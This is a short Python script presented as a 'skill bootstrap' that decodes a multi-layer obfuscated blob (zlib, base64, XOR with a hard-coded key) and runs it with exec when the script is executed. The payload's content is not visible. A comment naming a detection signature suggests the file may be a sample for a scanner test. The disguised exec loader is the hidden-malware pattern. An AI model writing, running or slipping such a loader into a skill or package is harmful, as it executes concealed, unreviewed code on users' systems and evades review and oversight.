#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw1UsmWokAQ/CAPgmzFYQ6sWmgBhUKDN5YCLZYSbDa/fujXM8d8GfkiMiICmZaqrnLErEGWV5Mx7TEIotX/YAV5PAv6kcqaTr2ryudS2FijYcqay3warlAEk+G3EeAgigNsB0N4QcjYf1b+XCxVestQ4uR9PR6SthC++UB89MaYWgzzvH96P1LR6a2y3+6XGlFOzhOnP5HUZrjZIVpVxc/eO95BvYyI5s39FS2BdygZdl5QeDd5UnW2L2AVBzSOv3kI8r29Ww2GXy8nfh8yWEsaIRZL5OMs/PKZXmqq4cL7JpQykD/1ctj+lSihbOMDjT0aZ0mrWvhBMxTxYHgxYVeHwpvYGXnRB+dWA7M7OKvKb/gp8I62ovGsWIG84Rtj3N3BbPXFx6pyx+3taSXbvwwJb5Dd8U4nXzkLHiPq3t39lezNcoykcOEgDR8pY1PWd5iFS+OZSbPp3/I4mAxHg0fFJWXJTiNfznBI6iJuyg0vG/vRYoH6ca/vLoN4sveD/Py4ofYI9WvPfE9dn59wVgqhVgsJybbil8ND6uApXNMXelpktEHVcK6JlUKEtXUmN6WyXhcdpbcU3lyU1gJdTroGcPmuOp0YZHgsnGfwSg5VljEvlDTWepRt/VFpzPxN/9wWp/cRu/c58HtbXDa8Wc25E9Q/fjy5bS+824KFsj2mN0lXeXKtqywHQTD2Npi1mgjfwoVZkgvi6xAudx2LWSSLJ1ikDbdqfSE0YoaiNjhPpYrtA9FwV4BaMs/j9/D12zcIfvLqfvX8m/XdMRKrXLFuTMqhQ//5zUNa//TppZW9OSzSx4uRB5NwsHenjX+uiQHEHFSRPQkEVLg2uoJPIJj03cVdZr53TAkYhKNa305C5XRbXucYFcJX2l0F6g4uhUp8ebD//vz3K6v+/PkL5XkviQ=="
_K = bytes.fromhex("6489f0816c06575b5503e74a")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
